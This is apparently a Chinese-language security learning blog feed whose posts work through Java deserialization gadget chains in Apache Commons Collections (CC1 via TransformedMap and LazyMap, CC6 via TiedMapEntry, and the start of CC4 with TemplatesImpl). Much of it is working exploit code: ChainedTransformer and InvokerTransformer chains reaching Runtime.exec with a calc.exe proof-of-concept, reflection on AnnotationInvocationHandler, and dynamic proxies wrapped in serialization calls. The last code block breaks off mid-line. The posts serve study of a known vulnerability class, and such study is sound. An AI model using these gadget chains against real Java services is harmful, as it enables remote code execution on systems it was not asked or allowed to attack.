Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br></code></pre></td></tr></table></figure><p>但我们刚才的目的是要试试这个方法来实现任意方法调用，那么很显然我们要用反射，我们先改写一下上面的payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br><span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br>execMethod.invoke(r,<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>草，之前存的项目不能用，重新构建一次呜呜呜<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204220359.png" alt="image.png"><br>终于可以了，感动<br>然后我们去用invokeTransformer<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204220725.png" alt="image.png"><br>它的参数是方法名，参数类型（array，参数（array</p><p>所以我们先直接调用<br>用这一行代码就可以解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure><p>我们现在已经找到了危险方法InvokerTransformer.transform，我们接着往回找谁调用了transform方法，直接查找用法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204221550.png" alt="image.png"><br>当然，三十几个调用，为了节省时间我们直接进入Map类里吧<br>我们可以看到TransformedMap中的CheckSetValue方法里调用了valueTransformer的transform方法<br>我们去瞅瞅valueTransformer是什么<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204221846.png" alt="image.png"><br>发现是可控的参数，于是我们可以尝试控制valueTransformer来控制我们跳转到invokeTransformer中去进行任意方法执行，但别忘了，它是一个protected方法，我们需要看看哪里调用了这个protected方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204222100.png" alt="image.png"><br>最后我们找到了这个方法<br>所以我们可以通过调用这个方法来控制TransformedMap进而控制valueTransformer再进行任意方法执行<br>我们只需要这样子写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">InvockerTransformer</span> <span class="hljs-operator">=</span> (InvokerTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(r);  <br>  <br>HashMap&lt;Object,Object&gt; map =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>  <br>TransformedMap.decorate(map,<span class="hljs-literal">null</span>,InvockerTransformer);<br></code></pre></td></tr></table></figure><p>接下来我们继续向上找哪里调用了checkSetValue方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204222705.png" alt="image.png"><br>发现了这处调用，而Entry的setValue是我们所熟悉的东西我们循环遍历这个Map，并且调用它的setValue方法<br>那我们只需要这样即可利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc.exe&quot;);  </span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br><span class="hljs-comment">//        Class  c = Runtime.class;  </span><br><span class="hljs-comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);  </span><br><span class="hljs-comment">//        execMethod.invoke(r,&quot;calc.exe&quot;);  </span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">InvockerTransformer</span> <span class="hljs-operator">=</span> (InvokerTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(r);  <br>  <br>        HashMap&lt;Object,Object&gt; map =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>        map.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);  <br>  <br>        Map&lt;Object,Object&gt; transormedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,InvockerTransformer);  <br>        <span class="hljs-keyword">for</span>(Map.Entry entry:transormedMap.entrySet())&#123;  <br>            entry.setValue(r);  <br>        &#125;  <br>    &#125;<br></code></pre></td></tr></table></figure><p>接下来我们看看谁调用了setValue方法<img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224004.png" alt="image.png"><br>我们发现直接有一个readObject方法调用了setValue方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224101.png" alt="image.png"><br>可以看清它是在遍历Map<br>我们看它的名字就知道它是动态代理那一水儿的东西<br>我们接下来看看这个Map是不是我们可控的<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224618.png" alt="image.png"><br>我们发现它就直接在构造函数里写着，那纯纯可控<br>那我们直接把我们刚写好的TransformedMap丢进去就行<br>但是我们看到这个类不是public，那default类型只能在相同包下才能访问，所以我们只能用反射了）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br><span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);  <br>annotationInvocationHandlerConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span>  annotationInvocationHandlerConstructor.newInstance(Override.class,transormedMap);<br></code></pre></td></tr></table></figure><p>但目前有一个问题就是Runtime对象没办法序列化，因为它没有继承序列化接口<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204225433.png" alt="image.png"><br>我们可以用反射来解决这个问题，它自己没办法实例化，那它的class呢<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204225621.png" alt="image.png"><br>结果是显然的<br>那么我们可以这样写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br> java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>);  <br> <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span>(Runtime) getRuntimeMethod.invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);  <br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class);  <br> execMethod.invoke(r,<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>但是我们需要写成这样才可以利用到这个循环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">InvockerTransformer</span> <span class="hljs-operator">=</span> (InvokerTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure><p>那么我们改写一下这一段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span>(Method)  <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);  <br>  <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);  <br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204231551.png" alt="image.png"><br>嗯，宣，这里这个InvokerTransformer真的调的人头晕）<br>这样Runtime就可以序列化了，而且这个是很符合我们之前看到了chainedTransformer，前一个的输出给后一个用，我们甚至可以设想用chainedtransformer来进行这一串<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204231857.png" alt="image.png"><br>我们只需要把想调用的方法写在一个数组里就可以让chainedTransformer进行链式调用<br>也就是将代码写成这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)  <br>&#125;;  <br>ChainedTransformer chainedTransformer=(ChainedTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204232547.png" alt="image.png"></p><p>嗯，宣<br>接下来我们解开之前的注释<br>我们还需要把之前这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204232652.png" alt="image.png"><br>改成chainedTransformer<br>但到现在我发现并不能执行<br>一步一步调试(no) 看别人找原因(yes)后发现问题在这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204233752.png" alt="image.png"><br>通过源码我们可以看到(虽然我这里没截到)我们要调用的方法在这个if里，但是就目前来看我们这里的memberType是null，也就是进不去这个if，那我们要怎么办嘞，改！<br>它在这里<img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234017.png" alt="image.png"><br>获取它的type并查找，所以我们在这里不能用Override了，得重新想个办法（抄个方法）也就是找一个有成员方法的东西，而且因为它是根据数组中的key来查找它的成员方法，所以我们还要将key改名为它的成员方法名字<br>所以我们看到了target<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234256.png" alt="image.png"><br>没错就是这个target<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234318.png" alt="image.png"></p><p>它是有成员方法的<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234437.png" alt="image.png"><br>经过更改后我们发现它不是null了，那也就代表我们可以进去这个if了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234506.png" alt="image.png"><br>是这样嘟，进去咯<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234553.png" alt="image.png"><br>到了我们想调用的方法了，如果这里可控制，那么我们就成功了<br>我们步入<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234710.png" alt="image.png"><br>发现是chainedTransformer没错倒是，但是value错了，在这里的<code>valueTransformer.transform(value);</code>就相当于我们刚才代码里的<code>chainedTransformer.transform(Runtime.class);</code><br>所以这里的value应该是Runtime.class而不是现在程序里的那个值，草<br>继续看别人的，发现他们找到了一个叫做constantTransformer的东西，功能和他的名字一样就是传什么返回什么，那即使它这里改了我们的value，如果我们在chainedTransformer的开头调用这个constantTransformer，它到我们现在写的这个数组的开头<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235207.png" alt="image.png"><br>这里的输出是一定的，所以我们只需要在这个数组前调用constantTransformer就可以了，最后的数组如下<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235306.png" alt="image.png"></p><p>这样我们就可以做到了，我们尝试运行</p><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235351.png" alt="image.png"><br>嗯，宣，成功力<br>进行一个庆祝，CC1应该还差一个LazyMap没调，明天一定）</p><h1 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h1><p>这二者之间的不同是来自于查找Transform方法调用的时候，也就是上一篇笔记的这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205155346.png" alt="image.png"><br>不止TransformedMap中有方法调用了transform，根据我当时的截图可以看到一共有三个Map中都有调用，我们这里要走的就是另外一条LazyMap这条链子<br>我们看到在这里，get方法调用了transform方法，这个不和上一个一样，找到这里发现直接是readObject调用，这里我们需要继续去查找谁调用了get，但是真的好多，查了一大堆<br>我们先看看它调用transform的这个factory是否可控，其实我们只需要传的时候传成chainedTransformer，并且能走到这个if里面就可以了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160201.png" alt="image.png"><br>然后直接看了yso，发现是<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160531.png" alt="image.png"><br>眼熟吧，很眼熟<br>我们直接去找这个类<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160712.png" alt="image.png"><br>这俩忘记消掉的断点就知道了<br>我们跟着yso去瞅瞅它的invoke方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160902.png" alt="image.png"><br>发现这里调用了get方法而且根据昨天的调试我们知道这个membervalue是可控的，AnnotationInvocationHandler它属于一个动态代理，扒拉完之前的笔记<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161052.png" alt="image.png"><br>也就是说只要外面有方法调用，就会转发到invoke进行处理，也就是说这个我们可以类比于PHP中的魔术方法了，自动调用的那种，像call但如像<br>所以我们需要先弄一个动态代理<br>还是得复习之前的笔记呜呜呜我好菜<br>我们看到yso发现他还是在用之前的readObject<br>那么我们先看看这个调用了get而且具有参数可控条件的invoke方法如何才可以成功调用<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161627.png" alt="image.png"><br>很明显，尽可能地不去调用equals方法，也不要参数类型的长度不等于0，emmmm直白点就是别调用readObject中的有参方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161920.png" alt="image.png"><br>这不就是了喵<br>所以我们接下来开始写一下<br>鉴于chainedTransformer那里没变，我们只需要注释后面的就可以了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205162305.png" alt="image.png"><br>我们发现LazyMap中有两个decorate方法，我们去调用后者，因为我们最后是要把chainedTransformer放进去的<br>接下来我们需要弄一个动态代理来实现它的invoke方法调用<br>其实这里我有点忘记了hhhh，翻翻笔记<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205162805.png" alt="image.png"><br>找到了这个<br>因为我们要代理的是一个Map所以我们需要这样构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,lazymapInvocationHandler);<br></code></pre></td></tr></table></figure><p>接下来因为我们还需要走到readObject中，所以我们再次使用上一个的最后一部分，记得这里的transformedMap要改成mapProxy了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205163621.png" alt="image.png"><br>于是我们尝试运行<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205163709.png" alt="image.png"><br>嗯，宣<br>最后代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)  <br>&#125;;  <br>ChainedTransformer chainedTransformer=(ChainedTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>HashMap&lt;Object,Object&gt; map =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>  <br>Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);  <br>  <br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br><span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);  <br>annotationInvocationHandlerConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">lazymapInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);  <br>  <br><span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,lazymapInvocationHandler);  <br>  <br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span>  annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);  <br>serialize(o);  <br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>结束力！！今天好快，今天估计能把CC2搞完喵</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>commons-collections 6</title>
    <link href="/2024/03/21/commons-collections%206/"/>
    <url>/2024/03/21/commons-collections%206/</url>
    
    <content type="html"><![CDATA[<p>为什么我不看CC2，而是选择在看完CC1之后去看CC6，是因为它和CC1的LazyMap有关系，所以我们将CC6拉前头看<br>这里是因为发现了一个TiedMapEntry的类，发现它的hashcode方法（注意这里和URLDNS链不同的是URLDNS链用的是HashMap里的hashcode方法，而这里是需要通过HashMap中的readObject来调用TiedMapEntry中的hashcode方法，二者本质上不同）</p><p>我们先去看TiedMapEntry的构造方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205172359.png" alt="image.png"><br>传完赋值<br>我们再去看看HashMap的readObject方法中是对key还是value调用hash<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205172810.png" alt="image.png"><br>这里很显然是对key进行了hash操作，说到这可能有点不明白这个hash和hashcode方法有什么关系，我们再去跟踪一手就能看出来<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205172901.png" alt="image.png"><br>其实它调用了key的hashcode方法，而这个key显然可控，所以我们需要将东西放到key里而不是value里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205173349.png" alt="image.png"><br>成功了，但是还记得URLDNS中的put方法中也有hash么<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205173425.png" alt="image.png"><br>我们去看看它的hash方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205173440.png" alt="image.png"><br>喵，眼熟了，所以说我们根本没有走我们设想的路，它直接通过hashMap的put方法走了hashcode，所以说即使我们注释掉序列化和反序列化，它也能用，看吧<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205173753.png" alt="image.png"><br>所以这还叫个钩钩的反序列化，所以我们又要像URLDNS链一样通过反射去改它的值<br>配上我当时的笔记<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205173854.png" alt="image.png"><br>但我们这里不是去修改hashcode的值，而是修改我们的factory，但是当我们修改好后发现还是不对，代码如下<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205174818.png" alt="image.png"><br>然后我们继续去看put中间发生了什么<br>一路跟到这里来发现<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205174849.png" alt="image.png"><br>它会去查有没有这个key，如果没有的话会把它放进去，那就我们在结束完put后把它添加的东西删掉<br>防止它调用的是&lt;lazyMap,f4u1t&gt;这个键值对，我们删掉它后再通过翻身修改发现它成功了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205175634.png" alt="image.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>commons-collections 4</title>
    <link href="/2024/03/21/commons-collections%204/"/>
    <url>/2024/03/21/commons-collections%204/</url>
    
    <content type="html"><![CDATA[<p>呜呜呜maven构建的好快，我猫猫都没看完</p><p>CC4了喵，加油喵<br>直接看yso的吧<br>PriorityQueue.readObjet-&gt;TransformingComparator.compare-&gt;CC3.InstantiateTransformer 之后</p><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><p>我们先分析一下cc3和cc4中不同之处的关键<br>点，就是这个compare方法，二者有什么不一样<br>CC3中<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206184529.png" alt="image.png"></p><p>CC4中<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206184512.png" alt="image.png"><br>二者所实现的接口不同，CC4实现了Serializable接口而CC3中没有</p><p>所以我们开始写代码咯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClazz</span> <span class="hljs-operator">=</span> templates.getClass();  <br>  <br>  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br>        nameField.setAccessible(<span class="hljs-literal">true</span>);  <br>        nameField.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);  <br>  <br>  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodeField</span> <span class="hljs-operator">=</span> templatesClazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br>        bytecodeField.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\codefile\\java\\out\\Test.class&quot;</span>));  <br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;  <br>        bytecodeField.set(templates,codes);  <br>  <br><span class="hljs-comment">//       InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);  